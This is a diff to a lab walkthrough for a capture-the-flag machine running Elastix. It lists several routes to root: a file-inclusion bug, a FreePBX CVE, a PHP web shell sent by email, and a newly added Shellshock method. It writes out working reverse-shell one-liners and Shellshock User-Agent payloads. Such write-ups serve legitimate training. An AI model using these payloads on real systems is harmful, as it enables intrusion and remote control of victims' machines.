@@ -10,7 +10,7 @@ description: 10.10.10.7
 
 The following exploits are covered for obtaining the flags on this target: ​
 
-Method 1 (LFI to RCE via FreePBX CVE; sudo ro root - detailed walkthrough below):
+Method 1 (LFI to RCE via FreePBX CVE; sudo to root - detailed walkthrough below):
 
 * User - Elastix 2.2.0 - 'graph.php' Local File Inclusion (EDB-ID: 37637), allows us to view the settings of components of the Asterisk Management Portal, including usernames and passwords. Login to the Elastix portal to find alot of info including an active phone ext number. Another way to get the extension is to use "sipvicious" ([https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)), for example (). Using the ext number, we're able to take advantage of CVE: 2012-4869 to get RCE and a shell as "asterisk".
 * Root - User "asterisk" can run sudo on multiple commands including chmod, chown, nmap etc.
@@ -20,12 +20,14 @@ Method 2 (LFI to SSH as root):
 * User - Elastix 2.2.0 - 'graph.php' Local File Inclusion (EDB-ID: 37637), allows us to view the settings of components of the Asterisk Management Portal, including usernames and passwords.
 * Root - SSH as "root" using password found in config via LFI.
 
-Method 3 (LFI to RCE via SMTP; sudo ro root):
+Method 3 (LFI to RCE via SMTP; sudo to root):
 
 * User - Elastix 2.2.0 - 'graph.php' Local File Inclusion (EDB-ID: 37637), allows us to view the current user via the file /proc/self/environ, which confirms it is "asterisk". Connect to SMTP port, verify "asterisk" has a mailbox, and send an email from anyone to "asterisk", with some PHP code in the data section (eg \<?php system($\_GET\["CMD"]); ?> ). Then use the LFI to view the mail at /var/mail/asterisk, and append the command to the LFI (eg \&CMD=bash -i >& /dev/tcp/10.10.14.7/9999 0>&1) to get a shell as "asterisk".
 * Root - User "asterisk" can run sudo on multiple commands including chmod, chown, nmap etc.
 
+Method 4 (Shellshock on Webmin to RCE as root):
 
+* Root - Webmin on port 10000 (http://10.10.10.7:10000) is vulnerable to Shellshock, however, the exploit is blind as the web server does not respond with output from commands. To exploit, verify using Shellshock in User-Agent header and the sleep command (eg. User-Agent: () { :;}; sleep 10 ). Get a reverse shell as root (eg. User-Agent: () { :;}; bash -i >& /dev/tcp/10.10.14.7/9999 0>&1).
 
 ## Enumeration:
 
